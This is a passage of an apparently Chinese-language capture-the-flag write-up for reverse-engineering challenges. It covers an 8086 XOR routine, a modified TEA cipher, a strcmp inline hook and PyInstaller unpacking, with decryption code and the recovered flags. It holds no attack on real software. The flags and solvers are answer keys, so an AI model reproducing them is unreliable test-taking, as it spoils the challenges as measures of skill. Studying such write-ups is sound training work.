class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ENC PROC</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV SI,OFFSET BUFFER1 + 2</span><br><span class="line">    MOV DI,OFFSET DATA1</span><br><span class="line">    MOV CX,8</span><br><span class="line">LOOP2:</span><br><span class="line">    MOV AX,WORD PTR[DI + 1]</span><br><span class="line">    XOR WORD PTR[SI],AX             ; *(SHORT*)(Input + i) ^= *(SHORT*)(DATA1 + i + 1)</span><br><span class="line">    MOV AX,WORD PTR[DI + 2]</span><br><span class="line">    XOR WORD PTR[SI + 2],AX         ; *(SHORT*)(Input + i + 2) ^= *(SHORT*)(DATA1 + i + 2)</span><br><span class="line">    ADD SI,4</span><br><span class="line">    ADD DI,4</span><br><span class="line">    LOOP LOOP2</span><br><span class="line">    POP CX</span><br><span class="line">    RET</span><br><span class="line">ENC ENDP</span><br></pre></td></tr></table></figure><p>由于DO1和DO2只是对DATA1这个静态数据进行操作，所以可以直接动调拦截到执行完DO1的DATA1数据进行对DATA2的解密。这题ASM代码故意给全的，就是为了让选手可以直接编译到EXE并且使用DosBox动调，（大伙入门8086汇编应该都用过的工具）。</p><p>直接g命令执行到DO1函数，并且p命令步过，</p><p><img src="/2025/03/06/GHCTF2025WP/1.png" alt="alt text"></p><p>再t命令步入ENC函数，再u命令反汇编就可以看到DATA1的地址。</p><p><img src="/2025/03/06/GHCTF2025WP/2.png" alt="alt text"></p><p>直接d命令就可以看到DATA1的数据，提取出来与DATA2进行解密计算即可得到flag。</p><p><img src="/2025/03/06/GHCTF2025WP/3.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> DATA1[] = &#123;</span><br><span class="line">        <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x3e</span>, <span class="number">0x27</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x37</span>,</span><br><span class="line">        <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3e</span>,</span><br><span class="line">        <span class="number">0x3f</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x28</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x2e</span>, <span class="number">0x2f</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> DATA2[] = &#123;</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x4F</span>,</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0x03</span>, <span class="number">0x47</span>, <span class="number">0x6F</span>, <span class="number">0x79</span>, <span class="number">0x07</span>, <span class="number">0x41</span>,</span><br><span class="line">        <span class="number">0x13</span>, <span class="number">0x47</span>, <span class="number">0x5E</span>, <span class="number">0x67</span>, <span class="number">0x5F</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>,</span><br><span class="line">        <span class="number">0x58</span>, <span class="number">0x63</span>, <span class="number">0x7D</span>, <span class="number">0x5F</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x35</span>,</span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint16_t</span> *)(DATA2 + i) ^= *(<span class="type">uint16_t</span> *)(DATA1 + i + <span class="number">1</span>);</span><br><span class="line">        *(<span class="type">uint16_t</span> *)(DATA2 + i + <span class="number">2</span>) ^= *(<span class="type">uint16_t</span> *)(DATA1 + i + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, DATA2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值"><a href="#Flag值" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;W0w_y0u&#39;re_g00d_@t_@5M!!&#125;</code></p><h2 id="LockedSecret"><a href="#LockedSecret" class="headerlink" title="LockedSecret"></a>LockedSecret</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这题本来是当作第一批第二难度的题，实际题解远低于FishingKit（），没想到展开Tea卡住了不少人了。</p><p>前面常规UPX变异脱壳就跳过讲解了，不会的新生可以去看文章再学习学习。<br>将脱完壳的程序拖入IDA分析，可以看到主函数内共有两个关键函数调用，byte_3F4060就是加密后的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/4.png" alt="alt text"></p><p>第一个函数的利用伪随机对一个全局数组进行初始化赋值。</p><p><img src="/2025/03/06/GHCTF2025WP/5.png" alt="alt text"></p><p>第二个函数就是加密函数，将一串明文key与上一个函数初始化的值进行异或计算得到用于加密的Key。底下加密部分代码由于IDA的反反编译器问题，导致有点丑陋，但是还是可以看出Tea加密的特征，只不过和常规Tea相比似乎少了循环。</p><p><img src="/2025/03/06/GHCTF2025WP/6.png" alt="alt text"></p><p>换到Ghidra分析得到的伪代码会更简洁，可以很清楚的看出就是Tea加密，不过用重复计算和不同的sum值来代替了循环加密。</p><p>将第二次计算的bc46effe减去5e2377ff会发现结果还是5e2377ff，所以可以知道5e2377ff就是delta值，那么这就是一个完整的从delta值开始的Tea加密。</p><p>并且两两计算为一组，可以看出是8轮加密的Tea，并且最后将加密完的值再异或上了0xf。</p><p><img src="/2025/03/06/GHCTF2025WP/7.png" alt="alt text"></p><p>直接断点该处获得Key，进行8轮的Tea解密即可得到Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/8.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0x5E2377FF</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x5E2377FF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] =</span><br><span class="line">&#123;</span><br><span class="line">        <span class="number">0x2D</span>,<span class="number">0xF7</span>,<span class="number">0x3D</span>,<span class="number">0x42</span>,<span class="number">0x01</span>,<span class="number">0x9A</span>,<span class="number">0xF5</span>,<span class="number">0x05</span>,<span class="number">0x1D</span>,<span class="number">0xCF</span>,<span class="number">0x3F</span>,<span class="number">0x63</span>,<span class="number">0x22</span>,<span class="number">0x91</span>,<span class="number">0xD1</span>,<span class="number">0x77</span></span><br><span class="line">&#125;; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> EncFlag[] = &#123; </span><br><span class="line">    <span class="number">0xDC</span>,<span class="number">0x45</span>,<span class="number">0x1E</span>,<span class="number">0x03</span>,<span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xE9</span>,<span class="number">0x76</span>,<span class="number">0x27</span>,<span class="number">0x47</span>,<span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x23</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0xD2</span>,<span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0x64</span>,<span class="number">0xDA</span>,<span class="number">0x7F</span>,<span class="number">0x46</span>,<span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0xB1</span>,<span class="number">0x03</span>,<span class="number">0x49</span>,<span class="number">0xA3</span>,<span class="number">0x27</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0xD1</span>,<span class="number">0x2C</span>,<span class="number">0x37</span>,<span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0xBD</span>,<span class="number">0x75</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span>) ^= <span class="number">0xf</span>;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span> + <span class="number">4</span>) ^= <span class="number">0xf</span>;</span><br><span class="line">        <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>,EncFlag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-1"><a href="#Flag值-1" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;!!!Y0u_g3t_th3_s3cr3t!!!&#125;</code></p><h2 id="FishingKit"><a href="#FishingKit" class="headerlink" title="FishingKit"></a>FishingKit</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>结合题目描述可以知道这题的考点是Hook。</p><p>首先程序要求输入bait数据，进行一个计算检验，这部分直接用z3就可以解出目标数据。</p><p><img src="/2025/03/06/GHCTF2025WP/9.png" alt="alt text"></p><p>z3代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a0,a1,a2,a3,a4,a5,a6,a7,a8,a9 = BitVecs(<span class="string">&quot;a0 a1 a2 a3 a4 a5 a6 a7 a8 a9&quot;</span>,<span class="number">12</span>) </span><br><span class="line"></span><br><span class="line">s.add(<span class="number">202</span> * a8 + <span class="number">216</span> * a5 - <span class="number">4</span> * a4 - <span class="number">330</span> * a9 - <span class="number">13</span> * a4 - <span class="number">268</span> * a6 == -<span class="number">14982</span>)</span><br><span class="line">s.add(<span class="number">325</span> * a8 + <span class="number">195</span> * a0 + <span class="number">229</span> * a1 - <span class="number">121</span> * a6 - <span class="number">409</span> * a6 - (a1 &lt;&lt; <span class="number">7</span>) == <span class="number">22606</span>)</span><br><span class="line">s.add(<span class="number">489</span> * a1 + <span class="number">480</span> * a6 + <span class="number">105</span> * a2 + <span class="number">367</span> * a3 - <span class="number">135</span> * a4 - <span class="number">482</span> * a9 == <span class="number">63236</span>)</span><br><span class="line">s.add(<span class="number">493</span> * a1 - <span class="number">80</span> * a4 - <span class="number">253</span> * a8 - <span class="number">121</span> * a2 - <span class="number">177</span> * a0 - <span class="number">243</span> * a9 == -<span class="number">39664</span>)</span><br><span class="line">s.add(<span class="number">275</span> * a4 + <span class="number">271</span> * a6 + <span class="number">473</span> * a7 - <span class="number">72</span> * a5 - <span class="number">260</span> * a4 - <span class="number">367</span> * a4 == <span class="number">14255</span>)</span><br><span class="line">s.add(<span class="number">286</span> * a0 + <span class="number">196</span> * a7 + <span class="number">483</span> * a2 + <span class="number">442</span> * a1 - <span class="number">495</span> * a8 - <span class="number">351</span> * a4 == <span class="number">41171</span>)</span><br><span class="line">s.add(<span class="number">212</span> * a2 + <span class="number">283</span> * a7 - <span class="number">329</span> * a8 - <span class="number">429</span> * a9 - <span class="number">362</span> * a2 - <span class="number">261</span> * a6 == -<span class="number">90284</span>)</span><br><span class="line">s.add(<span class="number">456</span> * a5 + <span class="number">244</span> * a7 + <span class="number">92</span> * a4 + <span class="number">348</span> * a7 - <span class="number">225</span> * a1 - <span class="number">31</span> * a2 == <span class="number">88447</span>)</span><br><span class="line">s.add(<span class="number">238</span> * a9 + <span class="number">278</span> * a7 + <span class="number">216</span> * a6 + <span class="number">237</span> * a0 + <span class="number">8</span> * a2 - <span class="number">17</span> * a9 == <span class="number">83838</span>)</span><br><span class="line">s.add(<span class="number">323</span> * a9 + <span class="number">121</span> * a1 + <span class="number">370</span> * a7 - (a4 &lt;&lt; <span class="number">6</span>) - <span class="number">196</span> * a9 - <span class="number">422</span> * a0 == <span class="number">26467</span>)</span><br><span class="line">s.add(<span class="number">166</span> * a9 + <span class="number">90</span> * a1 + <span class="number">499</span> * a2 + <span class="number">301</span> * a8 - <span class="number">31</span> * a2 - <span class="number">206</span> * a2 == <span class="number">88247</span>)</span><br><span class="line">s.add(<span class="number">355</span> * a0 + <span class="number">282</span> * a4 + <span class="number">44</span> * a9 + <span class="number">359</span> * a8 - <span class="number">167</span> * a5 - <span class="number">62</span> * a3 == <span class="number">76658</span>)</span><br><span class="line">s.add(<span class="number">488</span> * a6 + <span class="number">379</span> * a9 + <span class="number">318</span> * a2 - <span class="number">85</span> * a1 - <span class="number">357</span> * a2 - <span class="number">277</span> * a5 == <span class="number">35398</span>)</span><br><span class="line">s.add(<span class="number">40</span> * a0 + <span class="number">281</span> * a4 + <span class="number">217</span> * a5 - <span class="number">241</span> * a1 - <span class="number">407</span> * a7 - <span class="number">309</span> * a7 == -<span class="number">35436</span>)</span><br><span class="line">s.add(<span class="number">429</span> * a3 + <span class="number">441</span> * a3 + <span class="number">115</span> * a1 + <span class="number">96</span> * a8 + <span class="number">464</span> * a1 - <span class="number">133</span> * a7 == <span class="number">157448</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    ans = s.model() </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="string">f&quot;<span class="subst">&#123;ans[<span class="built_in">eval</span>(<span class="string">f&#x27;a<span class="subst">&#123;i&#125;</span>&#x27;</span>)]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(t),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到<strong>DeluxeBait</strong>字串</p><p>然后下面部分有个加密函数，可以看出是魔改RC4，加密完与一个数组进行比对，这边解密后会得到假Flag，有兴趣的可以自己解密试试。</p><p><img src="/2025/03/06/GHCTF2025WP/10.png" alt="alt text"></p><p>由于知道是Hook考点，直接字符串搜索VirtualProtect，定位，查找交叉引用，发现有一个函数有调用。</p><p><img src="/2025/03/06/GHCTF2025WP/11.png" alt="alt text"></p><p>可以看出这部分就是Hook代码，上面的0xff,0x25就是far jmp的汇编，参数一传进来要Hook的函数，参数二是自己的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/12.png" alt="alt text"></p><p>在他的调用上层就可以看到获取了模块和函数地址，不过做了异或加密处理，sub_140001CE0就是Hook函数要跳转执行的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/13.png" alt="alt text"></p><p>可以解密出来是strcmp，也就是对strcmp做了Hook，之前在主函数有看到strcmp，就是那里程序发生了跳转，没有执行真实的strcmp。</p><p><img src="/2025/03/06/GHCTF2025WP/14.png" alt="alt text"></p><p>所以接下来重点分析sub_140001CE0函数。可以看到这边是对数据进行了24轮Tea加密，最后与byte_1400063C8数组进行比对，那么byte_1400063C8就是真实被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/15.png" alt="alt text"></p><p>这边重点就是传入的buf和buf_1数据实际是什么，可以在赋这两个数组赋值完后处进行断点，查看实际数据。</p><p>可以发现实际上就是DeluxeBait字串以及输入的Flag值。</p><p><img src="/2025/03/06/GHCTF2025WP/16.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/17.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/18.png" alt="alt text"></p><p>由于buf数组在开头已经memset 0了，赋值的字串”DeluxeBait”长度仅有10，而Tea加密要的Key必须是16字节，所以最终进行加密的Key是这个字串加上6个0x00。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x66778899</span>, sum = delta * <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> EncFlag[<span class="number">24</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(EncFlag, <span class="string">&quot;!V&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    EncFlag[<span class="number">2</span>] = <span class="number">-105</span>;</span><br><span class="line">    EncFlag[<span class="number">3</span>] = <span class="number">-90</span>;</span><br><span class="line">    EncFlag[<span class="number">4</span>] = <span class="number">26</span>;</span><br><span class="line">    EncFlag[<span class="number">5</span>] = <span class="number">-43</span>;</span><br><span class="line">    EncFlag[<span class="number">6</span>] = <span class="number">-60</span>;</span><br><span class="line">    EncFlag[<span class="number">7</span>] = <span class="number">-34</span>;</span><br><span class="line">    EncFlag[<span class="number">8</span>] = <span class="number">-92</span>;</span><br><span class="line">    EncFlag[<span class="number">9</span>] = <span class="number">-100</span>;</span><br><span class="line">    EncFlag[<span class="number">10</span>] = <span class="number">-126</span>;</span><br><span class="line">    EncFlag[<span class="number">11</span>] = <span class="number">77</span>;</span><br><span class="line">    EncFlag[<span class="number">12</span>] = <span class="number">-47</span>;</span><br><span class="line">    EncFlag[<span class="number">13</span>] = <span class="number">69</span>;</span><br><span class="line">    EncFlag[<span class="number">14</span>] = <span class="number">-56</span>;</span><br><span class="line">    EncFlag[<span class="number">15</span>] = <span class="number">86</span>;</span><br><span class="line">    EncFlag[<span class="number">16</span>] = <span class="number">-89</span>;</span><br><span class="line">    EncFlag[<span class="number">17</span>] = <span class="number">-76</span>;</span><br><span class="line">    EncFlag[<span class="number">18</span>] = <span class="number">-106</span>;</span><br><span class="line">    EncFlag[<span class="number">19</span>] = <span class="number">92</span>;</span><br><span class="line">    EncFlag[<span class="number">20</span>] = <span class="number">77</span>;</span><br><span class="line">    EncFlag[<span class="number">21</span>] = <span class="number">73</span>;</span><br><span class="line">    EncFlag[<span class="number">22</span>] = <span class="number">-121</span>;</span><br><span class="line">    EncFlag[<span class="number">23</span>] = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Key[] = <span class="string">&quot;DeluxeBait\0\0\0\0\0\0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag + <span class="number">8</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag + <span class="number">16</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.23s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-2"><a href="#Flag值-2" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Wh@t_@_b1g_F1sh&#125;</code></p><h2 id="Mio？Ryo？Soyo？"><a href="#Mio？Ryo？Soyo？" class="headerlink" title="Mio？Ryo？Soyo？"></a>Mio？Ryo？Soyo？</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>第二批题目的签到题，常规的Python程序解包。</p><p>使用pyinstxtractor进行解包，需要对应程序python版本，使用python3.8运行，否则无法解压pyz文件得到Secret.pyc。</p><p><img src="/2025/03/06/GHCTF2025WP/19.png" alt="alt text"></p><p>使用uncompyle6进行pyc反编译program.pyc可以看到源码。发现引入了Secret文件，可以在PYZ-00.pyz_extracted找到对应pyc文件，同样使用uncompyle6得到源码。</p><p><img src="/2025/03/06/GHCTF2025WP/20.png" alt="alt text"></p><p>发现引入了SecretEncrypt文件，并且这边有program.py里看到被调用比对的数据，大概率就是被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/21.png" alt="alt text"></p><p>反编译得到SecretEncrypt代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MMMMiiiiiio</span>:</span><br><span class="line">    MMiiiiiiooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(Miiooooooooo) <span class="keyword">for</span> Miiooooooooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">118</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">MMMMiiooooooo</span>(<span class="params">MMMMMMMMMiiiooo: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        MMMMiiiiioooooooooo = <span class="string">&quot;&quot;</span></span><br><span class="line">        MMMMMMMiiiiioo = (<span class="number">4</span> - 